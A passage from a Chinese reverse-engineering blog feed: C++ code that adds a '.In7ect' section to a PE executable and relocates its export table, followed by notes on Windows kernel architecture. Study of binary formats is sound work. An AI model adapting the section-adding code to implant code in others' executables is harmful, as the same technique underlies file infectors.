<span class="number">0x1000</span>;</span><br><span class="line">	LPVOID pTempFileBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">//2）新增一个节表和全0x00的节数据	</span></span><br><span class="line">	<span class="comment">//节的名字为.In7ect</span></span><br><span class="line">	LPSTR Section_Name = <span class="string">&quot;.In7ect&quot;</span>;</span><br><span class="line">	<span class="built_in">AddNewSection</span>(Add_Section_Length,&amp;pTempFileBuffer,Section_Name);</span><br><span class="line"></span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader_Temp = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_NT_HEADERS pNTHeader_Temp = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_FILE_HEADER pPEHeader_Temp = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER32 pOptionHeader_Temp = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_SECTION_HEADER pSectionHeader_Temp = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_DATA_DIRECTORY pDataDirectory_Temp = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_EXPORT_DIRECTORY pExportDirectory_Temp = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (!pTempFileBuffer)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;(MoveExportTable)Can&#x27;t open file!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span> (*((PWORD)pTempFileBuffer) != IMAGE_DOS_SIGNATURE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;(MoveExportTable)No MZ flag, not exe file!\n&quot;</span>);</span><br><span class="line">		<span class="built_in">free</span>(pTempFileBuffer);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line">	pDosHeader_Temp = (PIMAGE_DOS_HEADER)pTempFileBuffer;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (*((PDWORD)((DWORD)pTempFileBuffer + pDosHeader-&gt;e_lfanew)) != IMAGE_NT_SIGNATURE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;(MoveExportTable)Not a valid PE flag!\n&quot;</span>);</span><br><span class="line">		<span class="built_in">free</span>(pTempFileBuffer);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pNTHeader_Temp = (PIMAGE_NT_HEADERS32)((DWORD)pTempFileBuffer + pDosHeader_Temp-&gt;e_lfanew);</span><br><span class="line">	pPEHeader_Temp = (PIMAGE_FILE_HEADER)(((DWORD)pNTHeader_Temp) + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD));</span><br><span class="line">	pOptionHeader_Temp = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader_Temp + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class="line">	pSectionHeader_Temp = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader_Temp + pPEHeader_Temp-&gt;SizeOfOptionalHeader);</span><br><span class="line">	pDataDirectory_Temp = (PIMAGE_DATA_DIRECTORY)pOptionHeader_Temp-&gt;DataDirectory;</span><br><span class="line">	pExportDirectory_Temp = (PIMAGE_EXPORT_DIRECTORY)(<span class="built_in">RVAToFOA</span>(pDataDirectory_Temp[<span class="number">0</span>].VirtualAddress, pTempFileBuffer) + (DWORD)pTempFileBuffer);</span><br><span class="line">	</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;DataDirectory[0].VirtualAddresscccccTTTT：&quot;</span> &lt;&lt; hex &lt;&lt; pExportDirectory_Temp-&gt;AddressOfFunctions &lt;&lt; endl;</span><br><span class="line">	<span class="comment">//3）先定位到导出表的三个地址表</span></span><br><span class="line">	DWORD *AddrFunctions = (DWORD *)((DWORD)pTempFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory_Temp-&gt;AddressOfFunctions, pTempFileBuffer));</span><br><span class="line">	DWORD *AddrName = (DWORD *)((DWORD)pTempFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory_Temp-&gt;AddressOfNames, pTempFileBuffer));</span><br><span class="line">	WORD  *AddrOrdinals = (WORD  *)((DWORD)pTempFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory_Temp-&gt;AddressOfNameOrdinals, pTempFileBuffer));</span><br><span class="line"></span><br><span class="line">	<span class="comment">//4）移动AddressOfFuncitons</span></span><br><span class="line">	<span class="comment">//计算addressOfFunctions的起始位置，在最后的一个节中</span></span><br><span class="line">	<span class="comment">//定位到新增节填充数据的起始位置</span></span><br><span class="line">	DWORD FileSize_Source = <span class="built_in">ReadPESize</span>(FILEPATH);</span><br><span class="line">	pSectionHeader_Temp = pSectionHeader_Temp + pPEHeader_Temp-&gt;NumberOfSections - <span class="number">1</span>;</span><br><span class="line">	PDWORD StartAddressofFunctions_Temp = (PDWORD)((DWORD)pTempFileBuffer+pSectionHeader_Temp-&gt;PointerToRawData);</span><br><span class="line">	<span class="comment">//PDWORD StartAddressofFunctions_Temp = (PDWORD)((DWORD)pTempFileBuffer + FileSize_Source);</span></span><br><span class="line">	<span class="built_in">memcpy</span>(StartAddressofFunctions_Temp, AddrFunctions, pExportDirectory_Temp-&gt;NumberOfFunctions * <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//5）移动AddressofNameOrdianls，移动的位置紧跟是紧跟addressOfFunctions后</span></span><br><span class="line">	<span class="comment">//修正新的起始位置</span></span><br><span class="line">	PWORD StartAddressofOrdianls_Temp = (PWORD)((DWORD)StartAddressofFunctions_Temp + pExportDirectory_Temp-&gt;NumberOfFunctions * <span class="number">4</span>);</span><br><span class="line">	<span class="comment">//printf(&quot;StartAddressofOrdianls_TempFOA：%x\n&quot;,(DWORD)StartAddressofOrdianls_Temp - (DWORD)pTempFileBuffer);</span></span><br><span class="line">	<span class="built_in">memcpy</span>(StartAddressofOrdianls_Temp, AddrOrdinals, pExportDirectory_Temp-&gt;NumberOfNames * <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//6）移动AddressofNames，移动的位置紧跟addressofOrdianls</span></span><br><span class="line">	<span class="comment">//修正新的起始位置</span></span><br><span class="line">	PDWORD StartAddressofNames_Temp = (PDWORD)((DWORD)StartAddressofOrdianls_Temp + pExportDirectory_Temp-&gt;NumberOfNames * <span class="number">2</span>);</span><br><span class="line">	<span class="comment">//printf(&quot;StartAddressofNames_TempFOA：%x\n&quot;,(DWORD)StartAddressofNames_Temp - (DWORD)pTempFileBuffer);</span></span><br><span class="line">	<span class="built_in">memcpy</span>(StartAddressofNames_Temp, AddrName, pExportDirectory_Temp-&gt;NumberOfNames * <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//7）拷贝函数名称，并修复新的AddressofNames中的地址</span></span><br><span class="line">	<span class="comment">//修正新的起始位置</span></span><br><span class="line">	PDWORD Start_Name_Address_Temp = (PDWORD)((DWORD)StartAddressofNames_Temp + pExportDirectory_Temp-&gt;NumberOfNames * <span class="number">4</span>);</span><br><span class="line">	PDWORD NameAddress_Temp = Start_Name_Address_Temp;</span><br><span class="line">	<span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; pExportDirectory_Temp-&gt;NumberOfNames; i++) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//获取原来的地址</span></span><br><span class="line">		DWORD NameofFOA = <span class="built_in">RVAToFOA</span>(*(AddrName + i), pTempFileBuffer);</span><br><span class="line">		<span class="comment">//拷贝</span></span><br><span class="line">		<span class="built_in">memcpy</span>( NameAddress_Temp, (PDWORD)((DWORD)pTempFileBuffer + NameofFOA), <span class="built_in">strlen</span>((LPSTR)((DWORD)pTempFileBuffer + NameofFOA)) + <span class="number">1</span>);</span><br><span class="line">		<span class="comment">//修复AddressofName_Temp的每一项的值，让PE文件解析的时候到该处来取函数名</span></span><br><span class="line">		*(StartAddressofNames_Temp + i) = <span class="built_in">FOAToRVA</span>((DWORD)NameAddress_Temp - (DWORD)pTempFileBuffer,pTempFileBuffer);</span><br><span class="line">		<span class="comment">//计算拷贝到新地址的起始位置</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%x:    %s\n&quot;</span>, <span class="built_in">strlen</span>((LPSTR)((DWORD)pTempFileBuffer + NameofFOA)), (PDWORD)((DWORD)pTempFileBuffer + NameofFOA));</span><br><span class="line">		NameAddress_Temp = (PDWORD)((DWORD)NameAddress_Temp + <span class="built_in">strlen</span>((LPSTR)((DWORD)pTempFileBuffer + NameofFOA))+<span class="number">1</span>);</span><br><span class="line">	&#125; </span><br><span class="line">	Start_Name_Address_Temp = NameAddress_Temp;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//8）修改pExportDirectory_Temp三个地址表的值，使其指向新的起点</span></span><br><span class="line">	pExportDirectory_Temp-&gt;AddressOfFunctions = <span class="built_in">FOAToRVA</span>((DWORD)StartAddressofFunctions_Temp - (DWORD)pTempFileBuffer,pTempFileBuffer);</span><br><span class="line">	pExportDirectory_Temp-&gt;AddressOfNames = <span class="built_in">FOAToRVA</span>((DWORD)StartAddressofNames_Temp - (DWORD)pTempFileBuffer,pTempFileBuffer);</span><br><span class="line">	pExportDirectory_Temp-&gt;AddressOfNameOrdinals = <span class="built_in">FOAToRVA</span>((DWORD)StartAddressofOrdianls_Temp - (DWORD)pTempFileBuffer,pTempFileBuffer);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//9）将导出表拷贝到新节中</span></span><br><span class="line">	<span class="comment">//修正新的起始地址</span></span><br><span class="line">	<span class="comment">//printf(&quot;新导出表的起始地址：%x\n&quot;,FOAToRVA((DWORD)Start_Name_Address_Temp - (DWORD)pTempFileBuffer,pTempFileBuffer));</span></span><br><span class="line">	<span class="built_in">memcpy</span>(Start_Name_Address_Temp, pExportDirectory_Temp, <span class="built_in"><span class="keyword">sizeof</span></span>(IMAGE_EXPORT_DIRECTORY));</span><br><span class="line"></span><br><span class="line">	<span class="comment">//10）将数据目录项中导出表指向新的位置</span></span><br><span class="line">	pDataDirectory_Temp[<span class="number">0</span>].VirtualAddress = <span class="built_in">FOAToRVA</span>((DWORD)Start_Name_Address_Temp - (DWORD)pTempFileBuffer,pTempFileBuffer);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//11）存盘</span></span><br><span class="line">	<span class="built_in">NewFileBufferToFile</span>(pTempFileBuffer, FileSize_Source + Add_Section_Length, New_File_Name);</span><br><span class="line">	<span class="comment">//*pFileBuffer_ExportTable = pTempFileBuffer;  	</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>











]]></content>
      <categories>
        <category>笔记</category>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows内核基础</title>
    <url>/post/Windows-Kernel-Base/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<h2 id="1-Windows-内核基础"><a href="#1-Windows-内核基础" class="headerlink" title="1 Windows 内核基础"></a>1 Windows 内核基础</h2><p>本文具体实现过程可看<a href="https://cataloc.gitee.io/blog/">cataLoc’s Blog</a></p>
<p><img data-src="https://img.shields.io/badge/%E6%9C%AC%E6%96%87%E5%8F%82%E8%80%83-%E3%80%8AWindows%E5%86%85%E6%A0%B8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0%E3%80%8B-1fd0f6.svg?colorA=ff69b4"></p>
<p><img data-src="https://img.shields.io/badge/%E6%9C%AC%E6%96%87%E5%8F%82%E8%80%83-%E3%80%8A%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90Windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC6%E7%89%88%E3%80%8B-1fd0f6.svg?colorA=ff69b4"></p>
<p>系统内核层，又叫零环（Ring0，简称<code>R0</code>，与此对应的应用层叫3环，即Ring3，简称<code>R3</code>），实际上是CPU的4个运行级别中的一个。CPU设计者将CPU的运行级别从内向外分为4个，依次为R0、R1、R2、R3，运行权限从R0到R3依次降低，也就是说，R0拥有最高执行权限，R3拥有最低执行权限。CPU 设计制造商在设计之初是让<mark class="label warning">R0运行内核，R1、R2 运行设备驱动，R3运行应用程序</mark>。</p>
<p>操作系统设计者与开发商在设计操作系统（例如微软Windows 和开源社区的Linus 编写的Linux）的时候，为了让工作变得简单，并没有使用R1和R2两个级别，而是将设备驱动运行在与内核同一个级别的R0级。<mark class="label default">在AMD64 CPU诞生之后，CPU的设计者干脆也和操作系统保持一致， 只保留了R0和R3两个级别</mark>。特权级环如图7.1 所示。</p>
<p><img data-src="https://i.loli.net/2021/05/14/Amb6SjJzFyM2oT9.png" alt="1.png"></p>
<h3 id="1-1-Widows-内核版本"><a href="#1-1-Widows-内核版本" class="headerlink" title="1.1 Widows 内核版本"></a>1.1 Widows 内核版本</h3><p>Microsoft在操作系统领域中的发展最早开始于MS-DOS，并于20世纪80年代后期开始按两个分支发展：</p>
<ol>
<li>一是基于MS-DOS的Windows 开发平台，并发展成Windows 95&#x2F;98&#x2F;Me这一系列操作系统；</li>
<li>另一个分支则是以Windows NT为代表的操作系统系列，经历了Windows NT 3.1&#x2F;3.5&#x2F;3.51&#x2F;4.0、Windows 2000、Windows XP&#x2F;Server 2003，一直到 Windows Vista&#x2F;Server 2008、Windows 7和Windows10。</li>
</ol>
<p>Windows NT由微软和IBM联合研制，分为微软的Microsoft OS&#x2F;2 NT与IBM的IBM OS&#x2F;2。协作后来不欢而散，IBM继续向市场提供先前的OS&#x2F;2版本，微软则把自己的OS&#x2F;2 NT的名称改为Windows NT，即第一代的Windows NT 3.1。</p>
<p>Windows内核（由于是从Windows NT发展而来的。也称为NT内核）从一开始就有良好的设计，其结构具备很好的可扩展性和安全性。所以，Windows 内核在20年的发展历程中一直能够很好地适应硬件的发展 ，在Windows操作系统的各个版本中并没有根本性的变化。本文介绍Windows 操作系统的基本框架，这些内容<strong>完全适用于Windows XP&#x2F;Server 2003及以后的版本</strong>。</p>
<p><img data-src="https://i.loli.net/2021/05/14/faGeXuCDJ9zrKsx.png" alt="2.png"></p>
<div class="note primary"><p><mark class="label success">WRK</mark></p>
<p>WRK的全称是“Windows Research Kernel”，它是微软为高校操作系统课程提供的可修改和跟踪的操作系统教学平台。它给出了Windows这个成功的商业操作系统的<strong>内核大部分代码</strong>，可以对其进行修改、编译，并且可以用这个内核启动Windows操作系统。可让学生将操作系统基本原理和商业操作系统内核联系起来，进一步加深对操作系统整体的理解</p>
<p>NT 5.2版本是一个特殊的版本，其核心代码经过简单的改编之后 已经向教育科研领域公开。这份公开源代码的内核称为Windows Research Kernel（Windows 研究内核），简称WRK。它包括了Windows内核中最重要的组件，例如内存管理器、进程和线程管理、对象管理器、缓存管理器、配置管理器、安全引用监视器和V&#x2F;O管理器等。 此内核源代码可以被编译成一个EXE可执行文件，然后安装到一个Windows Server 2003 SP1（x86系统）或Windows XP64位（AMD）系统中，替换其中的内核模块。因此，如果用户改变了源代码中的实现逻辑，则替换了内核模块之后的Windows Server 2003 SP1或 Windows XP 64位系统可以运行用户的代码逻辑。如果配置了调试环境，则还可以调试WRK内核和用户的代码。WRK是2006年7月份正式对外发布的，就当时而言，它代表了最新的Windows内核技术。</p>
</div>

<h3 id="1-2-重要的概念"><a href="#1-2-重要的概念" class="headerlink" title="1.2 重要的概念"></a>1.2 重要的概念</h3><ol>
<li><strong>Windows API函数</strong>：指Windows API中<strong>已被文档化</strong>的、可被调用的子例程（函数）， 例如 CreateProcess、CreateFile 和GetMessage。</li>
<li><strong>原生的系统服务</strong>（或者系统调用）：指操作系统中<strong>未文档化的</strong>、可在用户模式下调用的底层服务。例如，NtCreateUserProcess是一个内部系统服务，Windows 的CreateProcess函数调用该服务来创建新的进程。</li>
<li><strong>例程</strong>：即函数。</li>
<li><strong>子系统DLL</strong>：简单理解为Windows API，已文档化的API，native API。</li>
<li><strong>Native API</strong>：NT中有很多为公布的API（已文档化），习惯上大家喜欢把他们称为Native API。</li>
<li><strong>指令流</strong>：线程。</li>
<li><strong>陷阱处理器</strong>，是指与某个特定的中断或异常相关联的<strong>函数</strong>。</li>
</ol>
<p>搞懂子系统 执行体 ntdll.dll、ntoskrnl.exe</p>
<h2 id="2-Windows系统结构"><a href="#2-Windows系统结构" class="headerlink" title="2 Windows系统结构"></a>2 Windows系统结构</h2><p>图2.2显示了Windows基本结构。Windows 采用了双模式（dual mode）结构来保护操作系统本身，以避免被应用程序的错误所波及。操作系统核心运行在<mark class="label danger">内核模式</mark>（kemel mode）下，应用程序的代码运行在<mark class="label info">用户模式</mark>（user mode）下。每当应用程序需要用到系统内核或内核的扩展模块（内核驱动程序）所提供的服务时，应用程序通过硬件指令从用户模式切换到内核模式中，当系统内核完成了所请求的服务以后，CPU控制权又回到用户模式代码。</p>
<div class="note warning"><p>用户模式与内核模式指的是CPU处理器的访问模式。</p>
<p><strong>内核模式</strong>：它允许访问所有的系统内存和所有的CPU指令。</p>
<ul>
<li><p>虽然每个Windows进程都有自己私有的内存空间，<mark class="label warning">但是内核模式的操作系统和设备驱动程序代码共享同一个虛拟地址空间</mark>。虚拟内存中的每一个页面都被标记了处理器必须在什么访问模式下才可以读和&#x2F;或写该页面。系统空间中的页面只有在内核模式下才可以访问，而用户地址空间中的所有页面都可以在用户模式下访问。只读页面（比如那些包含静态数据的页面）在任何模式下都是不可写的。此外，在支持不可执行（no-execute）内存保护的处理器上，Windows将包含数据的页面标记为不可执行，从而防止数据区域被无意地或恶意地当作代码来执行。</p>
</li>
<li><p>对于在内核模式下运行的组件，32位Windows对它们所使用的私有系统内存并不提供读写保护。换句话说，一旦进入了内核模式，操作系统和设备驱动程序的代码可以完全访问系统空间的内存，也可以绕过Windows的安全机制直接访问对象。因为有大量的Windows操作系统代码运行在内核模式下。</p>
</li>
</ul>
</div>

<p><img data-src="https://i.loli.net/2021/05/18/gm2UhziLQqPZCFy.png" alt="4.png"></p>
<p><img data-src="https://i.loli.net/2021/05/17/sauiwhGfdyonWFP.png" alt="3.png"></p>
<p><img data-src="https://i.loli.net/2021/05/21/XvRPjltkhAZzxor.png" alt="8.png"></p>
<div class="note success"><p><strong>有4种用户模式进程：</strong></p>
<ol>
<li>固定的系统支持进程，如登陆进程，会话管理器进程。</li>
<li>服务进程，宿纳了windows服务，如进程管理器和假脱机服务。</li>
<li>用户应用程序，有6个类型：windows32位，windows64位，windows3.1 16位，ms-dos 16位，posix32位或者OS&#x2F;2 32位。</li>
<li>环境子系统服务进程，实现了操作系统环境的部分支持。这里的环境是指操作系统展示给用户或者程序员的个性化部分。</li>
</ol>
<p>在windows下，用户程序不能直接访问原始的windows服务，要通过一个或者多个子系统动态链接库。</p>
</div>

<div class="note danger"><p><strong>Windows内核组件（组成部分）包含：</strong></p>
<ol>
<li><strong>windows执行体</strong>，包含基本的操作系统服务，如内存管理，进程和线程管理，安全性，I&#x2F;O，网络，跨进程通信。</li>
<li><strong>windows内核</strong>，是由一组底层的操作系统功能构成，如线程调度，终端和异常处理分发。以及处理器同步。提供了一组例程和基础对象。执行体的其他部分利用这些例程和对象实现更高层次的功能。</li>
<li><strong>设备驱动程序</strong>，硬件设备驱动程序，也包含文件系统和网络驱动程序。其中硬件设备驱动程序将用户的I&#x2F;O函数调用转化为特定的硬件设备请求。</li>
<li><strong>硬件抽象层</strong>，指一层特殊代码，它把内核，设备驱动程序和windows执行体其他部分跟与平台相关的硬件差异隔离开来。</li>
<li><strong>窗口和图形系统</strong>：实现了图形用户界面函数。</li>
</ol>
</div>

<div class="note info"><p><strong>Windows子系统是Windows系统中一个不可缺少的组成部分</strong>，<mark class="label info">它与系统内核一起构成了用户应用程序的执行环境</mark>。Windows的原始设计是一个支持多环境子系统的操作系统，除了Windows子系统作为它的原生环境子系统，它还支持POSIX和OS&#x2F;2环境子系统，为UNIX类应用程序和OS&#x2F;2应用程序提供一个仿真执行环境。 随着Windows操作系统的发展，<mark class="label danger">自Windows XP以后，只有Windows子系统随系统一起发行</mark>。 Windows 子系统既有内核模式部分（图形和窗口管理），也有用户模式部分。用户模式部分包括一个单独的子系统进程和一组链接到各个应用进程中的系统DLL。</p>
</div>

<p><img data-src="https://i.loli.net/2021/05/18/CDISNmHRtX8zwpq.png" alt="5.png"></p>
<h3 id="2-1-CPU-模式"><a href="#2-1-CPU-模式" class="headerlink" title="2.1 CPU 模式"></a>2.1 CPU 模式</h3><p>在Intel x86处理器上，段描述符有一个 2位长度的特权级：<mark class="label danger">0</mark>表示最高特权级，<mark class="label default">3</mark>表示最低特权级。Windows 只使用0和3两种特权级（在有些资料上分别称为0环和3环）。通常特权级0表示CPU处于内核模式（kermel mode），3表示用户模式（user mdoe）。在任何时刻，处理器总是位于这两种模式之一。</p>
<p>处理器有许多指令只有在特权级0的模式下才可以使用，例如I&#x2F;O指令、操纵内部寄存器（如GDT、IDT、MSR）的指令等。</p>
<ul>
<li><p><strong>操作系统保护状态：</strong></p>
<ul>
<li>当处理器位于<strong>用户模式</strong>时，它处于一种相对隔离的状态：能够执行的指令是受限制的，能够访问的内存也是受限制的。且越过这些限制，就会<strong>引发处理器异常</strong>，因而操作系统可以捕获到这些异常，并决定处理器是否继续执行。因此，操作系统可以有足够的能力来<strong>保护</strong>自己免受用户模式代码的影响。（保护模式）</li>
<li>当处理器位于<strong>内核模式</strong>时，这<strong>一层保护不复存在</strong>，任何一个未被捕捉和处理的指令错误都会引起系统崩溃。</li>
</ul>
</li>
<li><p><strong>内存访问权限：</strong>在Windows中，当处理器位于不同模式下时，它可以访问的内存地址空间也是不一样的。</p>
<ul>
<li><strong>用户模式下</strong>，处理器只能访问当前进程的地址空间（有时也称为用户地址空间）；</li>
<li><strong>内核模式下</strong>，处理器不仅可以访问当前进程的地址空间，还可以访问系统地址空间。 内核模式下的代码和数据都是共享的，所有的进程一旦其指令流进人到内核模式下，则系统地址空间中的代码和数据都是相同的（有个别例外）。</li>
</ul>
</li>
</ul>
<p>一个指令流（即线程）在执行时，在以下情况下会发生<mark class="label warning">模式切换</mark>：</p>
<ul>
<li>用户模式代码触发了<mark class="label danger">异常</mark>，则控制流进入到内核模式，内核中的异常处理函数可以决定该控制流是否继续执行；</li>
<li>用户模式代码在执行时，被一个<mark class="label danger">中断</mark>打断 （软中断或硬中断），则控制流进入特权模式，等中断处理例程完成以后，它若调用<code>iret/iretd</code>指令，则控制流恢复到用户模式下，执行特殊的模式切换指令，例如Intel x86的<code>sysenter</code>指令，从用户模式切换到内核模式。而为了从内核模式切换到用户模式，通常简单地使用<code>sysexit</code>、<code>iret/iretd</code>这样的指令即可。由于系统空间是所有进程共享的，所以，任何一个进程在执行内核模式的代码时，实际上是在使用操作系统的服务。</li>
</ul>
<div class="note danger"><p>在Windows体系结构中，内核模式向上有一个执行体API，尽管它并非文档化的API，但对于应用程序而言，这便是系统服务。Windows将这些系统服务组织成了一张表，称为SDT（Service Descriptor Table，服务描述符表）。</p>
</div>



<h3 id="2-2-用户模式"><a href="#2-2-用户模式" class="headerlink" title="2.2 用户模式"></a>2.2 用户模式</h3><p><strong>（User mode）</strong></p>
<h4 id="2-2-1-Windows子系统"><a href="#2-2-1-Windows子系统" class="headerlink" title="2.2.1 Windows子系统"></a>2.2.1 Windows子系统</h4><div class="note default"><p>早期的Windows版本支持三个环境子系统：</p>
<ul>
<li><mark class="label primary">OS&#x2F;2</mark></li>
<li><mark class="label warning">POSIX</mark></li>
<li><mark class="label info">Windows</mark></li>
</ul>
<p><strong>到了Windows XP以后，只有Windows子系统（或Win32）随Windows操作系统起发行</strong>，而且，在Windows系统中，即使是没有交互用户登录的服务器系统，Windows 子系统也是必须运行的。相反，另外两个子系统被配置成按需启动。</p>
<p> Windows子系统的两个关键功能部件：窗口管理和GDI（Graphics Device Interface，图形设备接口）。</p>
</div>

<p>Windows对应用程序的支持是通过Windows的环境子系统来做到的，<mark class="label danger">任何一个用户应用程序都运行在特定的子系统环境中</mark>。</p>
<p>我们可以这样简单地理解：</p>
<ul>
<li>Windows 子系统是Windows操作系统不可分割的一部分，它在Windows内核的基础上，为应用程序提供了一个图形用户界面（GUI）环境；</li>
<li>OS&#x2F;2和POSIX则是为了兼容OS&#x2F;2和UNIX应用程序而提供的模拟环境。</li>
</ul>
<div class="note primary"><p>Windows子系统中既有用户模式部分，也有内核模式部分。</p>
<ul>
<li><p><strong>内核模式部分</strong>：核心是<mark class="label warning">win32k.sys</mark>，虽然它的形式是一个驱动程序，但实际上它并不处理I&#x2F;O请求，相反，它向用户代码提供了大量的系统服务。从功能上讲，它包含两部分：窗口管理（Window manager）和图形设备接口（GDI）。</p>
<ul>
<li>其中窗口管理部分负责收集和分发消息，以及控制窗口显示和管理屏幕输出；</li>
<li>图形设备接口部分包含各种形状绘制以及文本输出功能。</li>
</ul>
</li>
<li><p><strong>用户模式部分</strong>：包括Windows子系统进程<mark class="label warning">csrss.cxe</mark>以及一组动态链接库<mark class="label warning">DLL</mark>。</p>
<ul>
<li>Csrss.exe进程主要负责控制台窗口的功能，以及创建或删除进程和线程等。</li>
<li>子系统DLL则被直接链接到应用程序进程中，包括kernel32.dIl、user32.dIl、gdi32.dIl和advapi.dll等，负责实现<strong>已文档化</strong>的Windows API函数。除了有些可以直接在用户模式中完成以外，很多API函数需要调用执行体API或win32k.sys模块提供的系统服务。</li>
</ul>
</li>
</ul>
<p>应用程序通常并不直接使用操作系统提供的系统服务，而是通过调用系统DLL所提供的API函数，来间接地使用各种系统服务。Windows 子系统也使用了类似的模块结构，供应用程序直接调用的API函数位于一组子系统DLL中，这些子系统DLL再根据需要调用内核模式组件（win32k.sys）的功能。</p>
</div>

<p>子系统Windows结构如下图（图来自《Windows内核原理与实现》）：</p>
<p><img data-src="https://i.loli.net/2021/05/18/vUcp4MDyhN8ElL9.png" alt="7.png"></p>
<div class="note danger"><p>Windows子系统的组件为：</p>
<ol>
<li><p>用户模式部分：</p>
<ul>
<li><mark class="label warning">Windows子系统进程 Csrss.cxe</mark></li>
<li><mark class="label default">子系统DLL</mark></li>
</ul>
</li>
<li><p>内核模式部分：</p>
<ul>
<li><mark class="label primary">内核模块 Win32k.sys</mark></li>
<li><mark class="label info">图形设备驱动程序</mark></li>
</ul>
</li>
</ol>
</div>

<ol>
<li><mark class="label warning">Windows子系统进程 Csrss.cxe</mark>（运行在用户模式）：Windows子系统进程维护了所有属于该子系统的进程和线程的列表，并且设置进程的异常端口和调试端口，以便接收该进程中发生的异常和调试事件。类似地，当线程或进程退出或终止时，Windows子系统进程也会被通知到，从而维护子系统内部信息的一致性。

<p>它包含以下支持：</p>
<ul>
<li>控制台窗口。</li>
<li>创建和删除进程和线程。</li>
<li>支持16位虚拟DOS机（VDM，Virtual DOS Machine）进程。</li>
<li>其他一些函数，比如GetTempFile、DefinedDosDevice、ExitWindowsEx，以及少量自然语言支持函数。</li>
</ul>
</li>
<li><p>.<mark class="label default">子系统DLL</mark>：子系统DLL，例如user32.dIl、advapi32.dIl、gdi32.dll和kermel32.dlI，<strong>它们实现了已经文档化的Windows API函数</strong>，它们将已经文档化的Windows API函数，转译成Ntoskrnl.exe和Win32k.sys（<strong>两个内核模块</strong>）中恰当的且绝大多数未文档化的内核模式系统服务调用，甚至与环境子系统进程通信。</p>
</li>
<li><mark class="label primary">内核模块 Win32k.sys</mark>：虽然它的名称像是一个驱动程序，但实际上，win32k.sys并不遵从I/O管理器定义的程序模型，而仅仅是Windows内核的扩展而已。Win32k.sys包含两大功能组成部分：

<ul>
<li>窗口管理器（Window Manager）：负责控制窗口显示、管理屏幕输出、收集来自键盘、鼠标和其他设备的输人，以及将用户消息传递给应用程序。</li>
<li>GDI（Graphics Device Interface）：这是一个针对图形输出设备的函数库，包含了有关线、文本和图形绘制，以及操纵各种图形的函数。</li>
</ul>
</li>
<li><mark class="label info">图形设备驱动程序</mark>：这是一些与硬件相关的显示驱动程序、打印驱动程序，以及视频小端口驱动程序。</li>
</ol>
<p>用户应用程序并不直接调用Windows的系统服务，而是通过一个或者多个子系统DLL来进行。这些库导出的接口都有很好的文档说明，凡是链接（LoadLibrary函数）到该子系统的程序都可以调用这些接口。例如，<strong>Windows子系统DLL （比如Kernel32.dIl、Advapi32.dlI、 User32.dlI 和Gdi32.dI1）实现了Windows API函数</strong>。SUA子系统DLL (Psxll.dIl) 实现了SUA API函数。</p>
<h4 id="2-2-2-子系统DLL"><a href="#2-2-2-子系统DLL" class="headerlink" title="2.2.2 子系统DLL"></a>2.2.2 子系统DLL</h4><p>简单理解成<strong>子系统DLL为已经文档化的Windows API函数</strong>。</p>
<div class="note info"><p>应用程序调用子系统DLL中的某个函数时，可能有下述三种情况之一 :</p>
<ol>
<li>该函数完全是在该子系统DLL中实现的，在用户模式下运行。换句话说，该函数并没有给环境子系统进程（Csrss.exe）发送消息，也没有调用Windows执行体系统服务。该函数是在用户模式下完成的，运行的结果被返回给调用者。此类函数的例子有<code>GetCurrentProcess</code>（它总是返回-1，在所有与进程相关的函数中，-1被定义为代表当前进程）和<code>GetCurrentProcessld</code>（对于一个正在运行的进程，进程ID不会改变，所以此进程ID可以从某个缓存的地方获取到，从而避免要调用至内核中）。</li>
